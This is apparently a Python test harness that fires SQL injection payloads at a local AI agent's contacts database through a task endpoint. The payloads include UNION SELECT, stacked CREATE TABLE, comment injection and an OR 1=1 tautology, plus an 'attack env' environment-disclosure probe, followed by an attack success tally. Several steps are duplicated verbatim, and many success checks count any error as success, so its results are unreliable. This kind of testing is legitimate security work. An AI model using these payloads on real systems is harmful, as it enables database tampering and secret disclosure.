import requests
import uuid

AGENT_BASE_URL = "http://localhost:5050"

# Track attack results
detailed_report = []

def send_task(user_text):
    payload = {
        "id": str(uuid.uuid4()),
        "message": {
            "role": "user",
            "parts": [{"text": user_text}]
        }
    }
    resp = requests.post(f"{AGENT_BASE_URL}/tasks/send", json=payload)
    try:
        j = resp.json()
        # If conversational wrapper, extract agent reply
        if "messages" in j and j["messages"] and "parts" in j["messages"][-1]:
            agent_reply = j["messages"][-1]["parts"][0]["text"]
            return agent_reply, j
        else:
            return j, j
    except Exception:
        return {"error": resp.text}, {"error": resp.text}

def record_attack(name, payload, response, success):
    detailed_report.append({
        "name": name,
        "payload": payload,
        "response": response,
        "success": success
    })

def try_create_contacts_table():
    name = "CREATE TABLE via SQLi"
    payload = "insert 'Mallory', '555-9999'); CREATE TABLE contacts (id INTEGER PRIMARY KEY, name TEXT, phone TEXT);--"
    print(f"\n[{name}]")
    resp, raw = send_task(payload)
    # Success if no error, or error about table already existing
    success = (isinstance(resp, dict) and ("already exists" in str(resp) or "syntax error" not in str(resp)))
    record_attack(name, payload, raw, success)
    return resp

def try_insert_after_create():
    name = "INSERT after table creation"
    payload = "insert 'Mallory', '555-9999'"
    print(f"\n[{name}]")
    resp, raw = send_task(payload)
    success = (isinstance(resp, dict) and "error" not in resp)
    record_attack(name, payload, raw, success)
    return resp

print("Discovered Agent:", requests.get(f"{AGENT_BASE_URL}/.well-known/agent.json").json()["name"])

# 1. Show initial records
name = "SHOW initial records"
payload = "show"
print(f"\n[{name}]")
show_resp, show_raw = send_task(payload)
print(show_resp)
success = (isinstance(show_resp, dict) and "records" in show_resp)
record_attack(name, payload, show_raw, success)

# If table doesn't exist, try to create it via SQLi
if isinstance(show_resp, dict) and show_resp.get('error', '').startswith('no such table: contacts'):
    try_create_contacts_table()
    try_insert_after_create()

# 2. Insert a normal record
name = "INSERT normal"
payload = "insert 'Mallory', '555-9999'"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and "error" not in resp)
record_attack(name, payload, raw, success)

# 3. Insert with SQLi payload (UNION SELECT)
name = "INSERT SQLi UNION SELECT"
payload = "insert 'Mallory', '555-9999'); SELECT 1, name, phone FROM contacts--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 4. Insert with stacked queries to create a new table (should fail if contacts exists)
name = "INSERT SQLi create table hacked"
payload = "insert 'Mallory', '555-9999'); CREATE TABLE hacked (id int);--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 5. Insert with comment injection
name = "INSERT SQLi comment injection"
payload = "insert 'Mallory', '555-9999'--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 6. Insert with tautology (always true)
name = "INSERT SQLi tautology"
payload = "insert 'Mallory', '555-9999') OR 1=1--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 7. Show after SQLi insert
name = "SHOW after SQLi insert"
payload = "show"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and "records" in resp)
record_attack(name, payload, raw, success)

# 1. Show initial records
name = "SHOW initial records"
payload = "show"
print(f"\n[{name}]")
show_resp, show_raw = send_task(payload)
print(show_resp)
success = (isinstance(show_resp, dict) and "records" in show_resp)
record_attack(name, payload, show_raw, success)

# If table doesn't exist, try to create it via SQLi
if isinstance(show_resp, dict) and show_resp.get('error', '').startswith('no such table: contacts'):
    try_create_contacts_table()
    try_insert_after_create()

# 2. Insert a normal record
name = "INSERT normal"
payload = "insert 'Mallory', '555-9999'"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and "error" not in resp)
record_attack(name, payload, raw, success)

# 3. Insert with SQLi payload (UNION SELECT)
name = "INSERT SQLi UNION SELECT"
payload = "insert 'Mallory', '555-9999'); SELECT 1, name, phone FROM contacts--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 4. Insert with stacked queries to create a new table (should fail if contacts exists)
name = "INSERT SQLi create table hacked"
payload = "insert 'Mallory', '555-9999'); CREATE TABLE hacked (id int);--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 5. Insert with comment injection
name = "INSERT SQLi comment injection"
payload = "insert 'Mallory', '555-9999'--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 6. Insert with tautology (always true)
name = "INSERT SQLi tautology"
payload = "insert 'Mallory', '555-9999') OR 1=1--"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and ("error" in resp or "records" in resp))
record_attack(name, payload, raw, success)

# 7. Show after SQLi insert
name = "SHOW after SQLi insert"
payload = "show"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and "records" in resp)
record_attack(name, payload, raw, success)

# 8. Delete a normal record
name = "DELETE normal"
payload = "delete name='Alice'"
print(f"\n[{name}]")
resp, raw = send_task(payload)
print(resp)
success = (isinstance(resp, dict) and "error" not in resp)
record_attack(name, payload, raw, success)

# --- Final Summary Report ---
# Add environment disclosure attack to the report
name = "ENV Disclosure"
payload = "attack env"
env_resp, env_raw = send_task(payload)
success = (env_resp is not None and isinstance(env_resp, (str, dict)) and ("error" not in str(env_resp)))
record_attack(name, payload, env_raw, success)

print("\n================ SQL Injection & Attack Summary ================" )
successes = sum(1 for r in detailed_report if r["success"])
print(f"Attack Success Rate: {successes}/{len(detailed_report)} ({(successes/len(detailed_report))*100:.1f}%)\n")
print("Attack Results:")
for r in detailed_report:
    result = "SUCCESS" if r["success"] else "FAIL"
    print(f"- {r['name']}: {result}")
print("============================================================\n")
